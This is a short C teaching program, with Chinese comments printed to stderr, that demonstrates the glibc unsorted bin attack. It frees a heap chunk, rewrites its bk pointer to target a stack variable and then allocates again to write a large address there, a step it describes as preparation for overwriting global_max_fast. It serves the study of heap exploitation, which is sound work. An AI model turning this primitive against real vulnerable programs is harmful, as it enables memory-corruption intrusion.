#include <stdio.h>
#include <stdlib.h>

int main(){

    fprintf(stderr, "unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n");
    fprintf(stderr, "实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n");

    unsigned long stack_var=0;
    fprintf(stderr, "我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n", &stack_var, stack_var);

    unsigned long *p=malloc(0x410);
    fprintf(stderr, "一开始先申请一个比较正常的 chunk: %p\n",p);
    fprintf(stderr, "再分配一个避免与 top chunk 合并\n\n");
    malloc(500);

    free(p);
    fprintf(stderr, "当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n",(void*)p[1]);

    p[1]=(unsigned long)(&stack_var-2);
    fprintf(stderr, "现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n");
    fprintf(stderr, "我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n",(void*)p[1]);

    malloc(0x410);
    fprintf(stderr, "再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n");
    fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
